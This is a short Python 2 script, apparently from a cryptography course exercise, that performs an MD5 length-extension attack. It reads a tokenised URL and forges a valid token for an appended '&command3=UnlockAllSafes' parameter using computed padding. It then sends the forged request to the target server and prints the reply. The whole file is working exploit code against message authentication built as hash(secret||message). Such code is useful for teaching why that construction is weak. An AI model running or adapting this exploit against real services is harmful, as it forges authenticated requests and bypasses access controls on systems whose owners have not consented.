from pymd5 import md5, padding
import httplib, urlparse, sys
from urllib import quote
def compute_new_hash(token, user_param):
	cnt = (8 + len(user_param) + len(padding((len(user_param) + 8)*8)))*8

	new_hash = md5(state = token.decode("hex"), count = cnt)

	append_Str = "&command3=UnlockAllSafes"
	new_hash.update(append_Str)
	return new_hash.hexdigest()

def build_new_url(new_token, user_param, path):
	new_query = "token=" + new_token

	new_query = new_query + "&" + user_param
	pad = padding((8 + len(user_param))*8)
	new_query = new_query + quote(pad)
	new_query = new_query + "&command3=UnlockAllSafes"

	new_url = path + "?" + new_query
	return new_url

def main():
	if len(sys.argv) != 2:
		print "Usage: python len_ext_attack.py <url>"
		sys.exit(1)

	url = sys.argv[1]
	parsedUrl = urlparse.urlparse(url)

	query = parsedUrl.query

	#Extract the token and the parameters from the query
	query_params = query.split("&")
	token = query_params[0].split("=")[1]

	user_param = query.replace(query_params[0], '')
	user_param = user_param[1:]
	
	new_token = compute_new_hash(token, user_param)

	new_url = build_new_url(new_token, user_param, parsedUrl.path)

	hostname = parsedUrl.hostname
	port = parsedUrl.port
	#hostname = "localhost"
	#port = 34443
	try:
		conn = httplib.HTTPConnection(hostname, port)
		
		conn.request("GET", new_url)
		print conn.getresponse().read()
	except Exception as e:
		print e
	return

if __name__ == "__main__":
	main()
